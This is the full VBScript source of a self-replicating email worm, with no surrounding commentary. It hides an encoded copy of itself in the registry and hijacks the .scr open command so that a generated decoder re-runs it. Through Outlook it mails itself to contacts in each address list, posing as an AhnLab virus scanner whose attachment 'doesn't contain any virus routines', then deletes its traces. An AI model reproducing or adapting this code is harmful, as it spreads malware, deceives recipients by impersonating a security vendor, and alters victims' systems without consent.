on error resume next
Dim fso, a, b, X, o, g, e
Set fso = CreateObject("Scripting.FileSystemObject")
set a = fso.OpenTextFile(Wscript.ScriptFullname, 1)
b = a.ReadAll
set h = fso.CreateTextFile("c:\ahnlab.vbs", True)
h.Write b
h.Close
For o = 1 to Len(b)
X = X & Hex(Asc(Mid(b, o, 1)))
Next
set g = CreateObject("Wscript.Shell")
g.regwrite "HKEY_LOCAL_MACHINE\Ahnlab", X
g.regwrite "HKEY_CLASSES_ROOT\scrfile\shell\open\command\", "wscript.exe c:\v3.vbs"
mail()
decoder = "on error resume next" & vbcrlf & _
"dim e, y, z, data" & vbcrlf & _
"e = fromreg(""HKEY_LOCAL_MACHINE\Ahnlab"")" & vbcrlf & _
"function fromreg(gg)" & vbcrlf & _
"Set regedit = CreateObject(""WScript.Shell"")" & vbcrlf & _
"fromreg = regedit.regread(gg)" & vbcrlf & _
"end function" & vbcrlf & _
"For y = 1 to Len(e) Step 2" & vbcrlf & _
"z = z & Chr(""&h"" + Mid(e, y, 2))" & vbcrlf & _
"next" & vbcrlf & _
"data = replace(z, Chr(""&hDA""), vbcrlf)" & vbcrlf & _
"Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbcrlf & _
"set h = fso.CreateTextFile(""c:\v3+neo.vbs"", True)" & vbcrlf & _
"h.Write data" & vbcrlf & _
"h.Close" & vbcrlf & _
"Set fsa = CreateObject(""Wscript.Shell"")" & vbcrlf & _
"fsa.Run(""c:\v3+neo.vbs"")" & vbcrlf & _
"msgbox ""Checking registry values"", ,""Scanreg""" & vbcrlf & _
"fso.deletefile(""c:\v3+neo.vbs"")"
set j = fso.CreateTextFile("c:\v3.vbs", True)
j.write decoder
j.close
fso.deletefile(wscript.scriptfullname)
sub mail()
on error resume next
Set a = CreateObject("Outlook.Application")
Set b = a.GetNameSpace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
For y = 1 To b.AddressLists.Count
Set d = b.AddressLists(y)
x = 1
Set c = a.CreateItem(0)
For oo = 1 To d.AddressEntries.Count
e = d.AddressEntries(x)
c.Recipients.Add e
x = x + 1
If x > 101 Then oo = d.AddressEntries.Count
Next
c.Subject = "visit to http://www.ahnlab.com"
c.Body = "---------------- Ahnlab Online Scanner ------------------" & vbcrlf & _
"The attached file doesn't contain any virus routines" & vbcrlf & _
"-------------------------------------------------------------------" & vbcrlf & _
""
c.attachments.Add("c:\ahnlab.vbs")
c.Send
c.DeleteAfterSubmit = True
e = ""
Next
b.Logoff
End If
Set fso = CreateObject("Scripting.FileSystemObject")
fso.deletefile("c:\ahnlab.vbs")
end sub
'제작 : 안랩해커/대한민국/2003.01.01
'vbs.ahnlab